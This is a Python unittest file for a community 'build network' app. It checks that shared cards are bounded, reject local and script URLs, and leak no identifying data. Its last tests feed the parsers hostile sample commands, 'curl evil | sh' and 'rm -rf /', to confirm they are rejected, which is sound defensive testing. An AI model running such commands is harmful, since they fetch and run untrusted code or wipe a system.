import pathlib
import sys
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "bin"))

from build_network import (
    BuildJoin,
    BuildRoom,
    Idea,
    IdeaInterest,
    SetupCard,
    TestRequest,
    TestResult,
    parse_payload,
)
from build_network_social import (
    Challenge,
    CommunityEvent,
    HelpRequest,
    ShipPost,
    SolutionCard,
    UpdateReport,
    parse_social_payload,
)
from build_network_v2 import (
    BuildTaskUpdate,
    ChallengeJoin,
    EventRSVP,
    HelpOffer,
    SolutionVerification,
    parse_v2_payload,
)
from build_network_v3 import (
    HelperAvailability,
    ProjectActivity,
    SetupComponentShare,
    parse_v3_payload,
)
import build_network_app_v2 as app_v2
import build_network_app_v3 as app_v3


class BuildNetworkTests(unittest.TestCase):
    def test_idea_is_bounded_and_deduplicated(self):
        payload = Idea(
            title="  Better   multi monitor tool  ",
            summary="x" * 1000,
            tags=["QML", "qml", "Hyprland"],
            author="PixelComet",
        ).to_payload()
        self.assertEqual(payload["title"], "Better multi monitor tool")
        self.assertEqual(payload["tags"], ["QML", "Hyprland"])
        self.assertLessEqual(len(payload["summary"]), 360)

    def test_interest_and_join_are_references_not_remote_actions(self):
        interest = IdeaInterest(idea_id="idea_123", note="I can test this").to_payload()
        join = BuildJoin(room_id="build_123", role="AMD tester").to_payload()
        self.assertEqual(interest["idea_id"], "idea_123")
        self.assertEqual(join["room_id"], "build_123")
        self.assertNotIn("command", interest)
        self.assertNotIn("command", join)

    def test_build_room_rejects_non_http_repo_url(self):
        payload = BuildRoom(
            title="OLED monitor",
            repo_url="file:///home/me/secrets",
            roles_needed=["Designer", "AMD tester"],
        ).to_payload()
        self.assertEqual(payload["repo_url"], "")

    def test_setup_card_is_metadata_only(self):
        payload = SetupCard(
            title="My setup",
            theme="Catppuccin",
            plugins=["Friends", "Spotify"],
            components=["x86_64", "Linux"],
            repo_url="https://github.com/example/dotfiles",
            wallpaper_url="https://example.com/wallpaper.jpg",
        ).to_payload()
        self.assertEqual(payload["type"], "setup_card")
        self.assertNotIn("commands", payload)
        self.assertNotIn("files", payload)
        self.assertEqual(payload["repo_url"], "https://github.com/example/dotfiles")

    def test_test_request_and_result_round_trip(self):
        request = TestRequest(
            title="Friends beta",
            artifact_url="https://github.com/example/project",
            requested_tags=["NVIDIA", "AMD", "Framework"],
        ).to_payload()
        self.assertEqual(parse_payload(request).title, "Friends beta")

        result = TestResult(
            request_id=request["id"],
            result="pass",
            environment_tags=["NVIDIA", "RTX 4060"],
            note="Starts and receives messages.",
        ).to_payload()
        self.assertEqual(parse_payload(result).result, "pass")

    def test_help_request_bounds_ai_tried_context(self):
        payload = HelpRequest(
            title="Wi-Fi disconnects",
            problem="Disconnects after resume",
            tried="agent attempted restart " + ("x" * 1000),
            environment_tags=["Intel", "Omarchy"],
        ).to_payload()
        self.assertLessEqual(len(payload["tried"]), 500)
        self.assertNotIn("private_files", payload)

    def test_solution_rejects_local_source_url(self):
        payload = SolutionCard(
            title="Fix wake issue",
            problem="Blank screen",
            solution="Reload the affected user service.",
            source_url="file:///home/user/private-notes.md",
        ).to_payload()
        self.assertEqual(payload["source_url"], "")

    def test_ship_event_challenge_and_update_are_bounded_cards(self):
        ship = ShipPost(title="GPU widget", artifact_url="https://github.com/example/widget").to_payload()
        event = CommunityEvent(title="Bengaluru meetup", event_url="https://example.com/event").to_payload()
        challenge = Challenge(title="Weekend build", prompt="Make something delightful").to_payload()
        report = UpdateReport(version="4.13", result="working", environment_tags=["NVIDIA"]).to_payload()
        self.assertEqual(ship["type"], "ship_post")
        self.assertEqual(event["type"], "community_event")
        self.assertEqual(challenge["type"], "challenge")
        self.assertEqual(report["result"], "working")

    def test_v2_participation_objects_are_reference_only(self):
        offer = HelpOffer(help_id="help_123", note="I can look").to_payload()
        verify = SolutionVerification(solution_id="solution_123", result="worked").to_payload()
        rsvp = EventRSVP(event_id="event_123", response="going").to_payload()
        join = ChallengeJoin(challenge_id="challenge_123", repo_url="https://github.com/example/team").to_payload()
        task = BuildTaskUpdate(room_id="build_123", task="AMD test", status="doing").to_payload()

        for payload in (offer, verify, rsvp, join, task):
            self.assertNotIn("command", payload)
            self.assertNotIn("shell", payload)
            self.assertNotIn("files", payload)
            self.assertEqual(parse_v2_payload(payload).id, payload["id"])

    def test_v2_challenge_join_rejects_local_repo_url(self):
        payload = ChallengeJoin(challenge_id="challenge_123", repo_url="file:///tmp/team").to_payload()
        self.assertEqual(payload["repo_url"], "")

    def test_v3_helper_availability_is_bounded_metadata(self):
        payload = HelperAvailability(
            mode="pair",
            skills=["QML", "NVIDIA", "QML"],
            environment_tags=["Omarchy 4.14", "NVIDIA"],
            note="Happy to pair on a plugin",
            available_minutes=999,
        ).to_payload()
        self.assertEqual(payload["mode"], "pair")
        self.assertEqual(payload["skills"], ["QML", "NVIDIA"])
        self.assertEqual(payload["available_minutes"], 240)
        self.assertNotIn("command", payload)
        self.assertEqual(parse_v3_payload(payload).mode, "pair")

    def test_v3_setup_component_rejects_local_and_script_urls(self):
        local = SetupComponentShare(component_type="bar", name="My bar", source_url="file:///home/me/bar.qml").to_payload()
        script = SetupComponentShare(component_type="plugin", name="Bad", source_url="javascript:alert(1)").to_payload()
        self.assertEqual(local["source_url"], "")
        self.assertEqual(script["source_url"], "")
        self.assertNotIn("contents", local)
        self.assertNotIn("commands", local)

    def test_v3_project_activity_is_link_metadata_only(self):
        payload = ProjectActivity(
            activity_type="pull_request",
            title="Fix AMD rendering",
            url="https://github.com/example/repo/pull/7",
            repo_url="https://github.com/example/repo",
            reference="#7",
        ).to_payload()
        self.assertEqual(payload["activity_type"], "pull_request")
        self.assertEqual(payload["reference"], "#7")
        self.assertNotIn("patch", payload)
        self.assertNotIn("diff", payload)
        self.assertNotIn("token", payload)

    def test_github_snapshot_parser_only_accepts_public_github_repo_urls(self):
        self.assertEqual(app_v3._github_repo_parts("https://github.com/harshithnadig/omarchy-friends"), ("harshithnadig", "omarchy-friends"))
        with self.assertRaises(ValueError):
            app_v3._github_repo_parts("http://github.com/example/repo")
        with self.assertRaises(ValueError):
            app_v3._github_repo_parts("https://example.com/owner/repo")
        with self.assertRaises(ValueError):
            app_v3._github_repo_parts("file:///home/user/repo")

    def test_safe_environment_has_no_identifying_fields(self):
        payload = app_v2.safe_environment()
        self.assertEqual(set(payload), {"tags", "omarchy_version", "architecture", "gpu_vendor", "kernel"})
        serialized = repr(payload).lower()
        for forbidden in ("hostname", "username", "ip_address", "serial", "home/"):
            self.assertNotIn(forbidden, serialized)

    def test_all_extension_parsers_fail_closed_for_remote_execution(self):
        malicious = {"type": "remote_exec", "command": "curl evil | sh"}
        for parser in (parse_social_payload, parse_v2_payload, parse_v3_payload):
            with self.assertRaises(ValueError):
                parser(malicious)

    def test_unknown_core_payload_is_rejected(self):
        with self.assertRaises(ValueError):
            parse_payload({"type": "run_shell", "command": "rm -rf /"})


if __name__ == "__main__":
    unittest.main()
